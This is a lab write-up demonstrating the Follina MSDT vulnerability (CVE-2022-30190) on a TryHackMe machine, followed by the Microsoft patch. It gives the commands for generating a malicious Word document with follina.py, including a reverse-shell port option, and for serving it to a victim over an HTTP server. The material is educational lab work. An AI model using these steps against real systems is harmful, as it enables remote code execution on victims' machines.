# Vulnerability Demonstration: “Follina”

## 1. Explanation of Vulnerability

The **Follina** vulnerability affects the Microsoft Windows Support Diagnostic Tool (MSDT). It is activated when MSDT is invoked via a URL protocol from an application like Microsoft Word. Here's an overview:

- **Vulnerability Details**:
  - **Affected Component**: Microsoft Windows Support Diagnostic Tool (MSDT)
  - **Trigger**: Invoked via a URL protocol from applications like Microsoft Word
  - **Exploit**: Crafting a malicious document that executes arbitrary code when opened
  - **Execution Context**: Executes with the privileges of the application calling MSDT
  - **Risk**: No need for macros to be enabled; simply opening a document can exploit the vulnerability
  - **Impact**: Allows attackers to potentially take control of the affected system

## 2. Overview of System Setup

### Windows Server

- **Setup**: Use a vulnerable Windows Server hosted on [TryHackMe](https://tryhackme.com), specifically configured to exhibit the Follina MSDT flaw.
- **Instructions**:
  1. Create an account on TryHackMe and search for “msdt-Follina” to exploit the vulnerability.
  2. Under Task 4: Exploiting the Follina Windows Vulnerability, click “Start Machine” to launch the instance.
  3. [Source Link](https://tryhackme.com)

### Kali Linux VM

- **Setup**: Configure Kali Linux on a local VMware to act as the attacking system.
- **Sources**:
  - [Get Kali Linux ISO](https://www.kali.org/downloads/)
  - [Download VMware Workstation Pro](https://www.vmware.com/products/workstation-pro.html)

## 3. Network Setup

- **Configuration**: Ensure both systems are correctly networked to communicate via OpenVPN.
- **Instructions**:
  1. Go to TryHackMe website and navigate to `Access > Machines > VPN server`.
  2. Select “IN-Regular-1” from the drop-down menu and download the configuration file.
  3. Transfer the file to the Kali machine and run: `sudo openvpn downloadedfile.ovpn` to establish the VPN connection.

## 4. Exploitation Tools

- **Required Tools**: Equip the Kali machine with tools for crafting and sending the malicious document, such as Metasploit.

## 5. Test and Observe

- **Execution**:
  1. **Generate the Payload**:
     - Clone the exploit code from [John Hammond's GitHub Repository](https://github.com/JohnHammond/msdt-follina).
     - Run `follina.py` to create the malicious Word document. Use optional flags like `--command` to specify the payload command:
       ```sh
       python3 follina.py
       python3 follina.py -c “notepad.exe”
       python3 follina.py -r 9001
       ```
  2. **Serve the Payload**:
     - Start an HTTP server to host the payload:
       ```sh
       python3 -m http.server 8080
       ```
  3. **Distribute the Document**:
     - From the victim machine, access the malicious file at `http://attackingmachineIP:8080` and download `follina.doc`.
  4. **Document Execution**:
     - The victim opens the document, triggering the exploit via the embedded malicious link.
    
![image](https://github.com/user-attachments/assets/89e9b4a8-c1d3-4da8-9a77-71e495f6065e)

**Figure 1**: Description of the MSDT vulnerability.

## 6. Clarity of Demonstration of Exploit

- **Clone Repository**:
  - Obtain the exploit code from [John Hammond's GitHub - msdt-follina](https://github.com/JohnHammond/msdt-follina).
  - Note: This code is intended for educational purposes only in controlled environments.
- **Execute Script**:
  - Run `follina.py` to generate the malicious Word document with different commands.
- **Serve Payload**:
  - Use the HTTP server setup to distribute the document.
- **Document Execution**:
  - Ensure the victim opens the document to trigger the exploit.

![image](https://github.com/user-attachments/assets/2f4e145a-61d2-43f4-b1d1-0782ffcf7aa7)

**Figure 2**: 
- Left: Victim opening the malicious document and “calc.exe” being executed.
- Right: Execution of `follina.py` on the attacking machine.

## 7. Exploitation Failure

- **Troubleshooting**:
  1. Check system configurations and network settings.
  2. Verify the payload syntax and the integrity of the malicious file.
  3. Ensure all tools and scripts are up-to-date and compatible with the target.
  4. Monitor system and network logs for errors or alerts.

## 8. Demonstration of Patch

- **Patch Identification**:
  - Locate the Microsoft security update addressing CVE-2022-30190: [Microsoft Security Update Guide](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190).
- **Patch Application**:
  1. Install the security update on all affected systems.
  2. Verify the patch application and test the system for vulnerability mitigation.
- **Ongoing Monitoring**:
  - Regularly check for updates and monitor systems for unusual activities.

**Note**: Regularly update and review security measures to ensure continued protection.


